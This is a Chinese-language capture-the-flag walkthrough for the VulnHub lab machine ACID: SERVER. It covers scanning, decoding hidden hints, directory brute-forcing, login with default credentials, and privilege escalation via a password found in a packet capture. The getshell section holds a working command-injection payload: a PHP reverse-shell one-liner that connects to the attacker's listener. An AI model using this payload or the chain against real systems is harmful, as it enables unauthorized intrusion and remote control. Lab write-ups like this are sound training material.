# 原创
：  VulnHub渗透测试实战靶场 - ACID: SERVER

# VulnHub渗透测试实战靶场 - ACID: SERVER

#### VulnHub渗透测试实战靶场 - ACID: SERVER

## 环境下载

> 
戳此进行[环境下载](https://download.vulnhub.com/acid/Acid.rar)


## ACID: SERVER靶机搭建

> 
将下载好的靶机环境，导入VMware，将其网络适配设置为`NAT`模式，运行即可


## 渗透测试

### 信息收集

> 
使用Kali自带的工具`netdiscover`进行子网探测：`sudo netdiscover -r 192.168.246.0/24`


> 
用Nmap对获取到的靶机IP地址进行扫描：`sudo nmap -sS -A -p 1-65535 192.168.246.130`，发现其33447端口是开放的


### 漏洞挖掘

> 
查看33447端口：`http://192.168.246.130:33447/`，F12查看源码时发现一个十六进制字符串`0x643239334c6d70775a773d3d`转字符串得到`d293LmpwZw==`解base64得到`wow.jpg`


> 
用`dirsearch`爆破一下web目录：`python3 dirsearch.py -u 192.168.246.130:33447 -e *.php`


> 
发现存在`http://192.168.246.130:33447/images/`，结合上一步解密得到的图片名字<br/> 访问：`http://192.168.246.130:33447/images/wow.jpg`，将图片下载下来分析：`strings wow.jpg`


> 
在图片的结尾发现一串可疑字符：


```
37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34

```

> 
用burpsuite的Decoder模块解码得到：`7aee0f6d588ed9905ee37f16a7c610d4`


> 
看长度有点像hash值，尝试MD5解密，得到：`63425`


> 
用`DirBuster`扫描一下web目录，发现`index.php、error.php、cake.php、hacked.php、include.php`


> 
`/Challenge/index.php`页面的源代码中，可以找到`js/forms.js`打开发现在文件中有版权信息


> 
谷歌搜索：`peredur.net form_js`，网页第一个[链接](https://github.com/peredurabefrog/phpSecureLogin/blob/master/index.php)就是，查看commit，在README.md中找到Email和Password相关信息


```
Username	: test_user 
Email		: test@example.com 
Password	: 6ZaxN2Vzm9NUJT2y

```

> 
利用找到的默认信息成功登录，点击页面链接跳转到`http://192.168.246.131:33447/Challenge/include.php`


> 
查看源码，在底部发现`0x5933566a4c6e4a34626e413d`，依照前面的思路解密得到`Y3VjLnJ4bnA=`，base64再次解密得到`cuc.rxnp`，rot13解密得到`php.ekac`，反过来就是`cake.php`


> 
访问`cake.php`，根据页面提示再次进行目录扫描：`python3 dirsearch.py -u 192.168.246.131:33447/Challenge/Magic_Box -e *.php`


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b4c9a3e00ddd4d2aad8b8fc46169aec7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0971c4fd451749cfa05e749d6200bb6c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
根据扫描结果，访问`http://192.168.246.131:33447/Challenge/Magic_Box/command.php`，测试后发现存在命令执行漏洞


### getshell

> 
起一个监听，在存在命令注入的页面执行：


```
www.baidu.com;php -r '$sock=fsockopen("192.168.246.129",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'

```

### 提权

> 
信息查找发现两个可疑用户：`acid、saman`


> 
在acid的家目录加看到一个名为`.sudo_as_admin_successful`大小为0的文件，提示普通用户可以切换为root用户


> 
查找acid这个用户的文件来获取他的密码来切换账户：`find / -user acid 2&gt;/dev/null`，发现`hint.pcapng`流量包文件


> 
用python搭建Server下载下来进行流量分析：`python -m SimpleHTTPServer 9999`


> 
分析TCP协议，可以发现一段明文传输的对话，发现`saman`用户及其密码`1337hax0r`


> 
用得到的密码切换saman用户后再`sudo su`提权到root，成功拿到root权限

